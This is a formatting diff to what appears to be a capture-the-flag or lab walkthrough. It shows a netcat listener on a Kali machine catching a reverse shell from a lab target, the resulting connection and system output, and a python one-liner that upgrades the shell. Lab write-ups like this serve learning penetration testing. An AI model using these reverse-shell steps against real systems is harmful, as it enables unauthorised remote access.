@@ -529,7 +529,8 @@ the URL syntax would be as following:
 Next, on the Kali machine netcat needs to be fired up to listen on the desired
 port and when the file is browsed the reverse shell is obtained.
 
-```root@kali:~# nc -nvlp 443
+```
+root@kali:~# nc -nvlp 443
 listening on [any] 443 ...
 connect to [192.168.20.144] from (UNKNOWN) [192.168.20.149] 57386
 Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
@@ -550,6 +551,7 @@ command:
 $ python -c "import pty;pty.spawn('/bin/bash')"
 www-data@ubuntu:/$
 ```
+
 ### Enumeration
 
 From previous enumeration it’s known that home directory of user saket is
